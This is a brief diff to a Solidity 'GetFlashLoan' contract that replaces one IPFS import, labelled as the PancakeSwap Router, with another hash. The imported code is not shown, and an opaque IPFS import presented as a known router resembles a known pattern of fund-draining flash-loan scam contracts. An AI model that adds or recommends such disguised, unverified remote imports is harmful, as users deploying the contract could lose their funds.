@@ -10,7 +10,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
 //PancakeSwap Router
-import "ipfs://QmaVrZceCz6MWdMHwpd47ZwB7nZFDB5Mha2N8dcboxxsjg";
+import "ipfs://QmaV6ZrKdWscNkLxmerCKNUZNS8NEFd4WF2Q3UeBRFq6G6";
 
 contract GetFlashLoan {
 	string public tokenName;
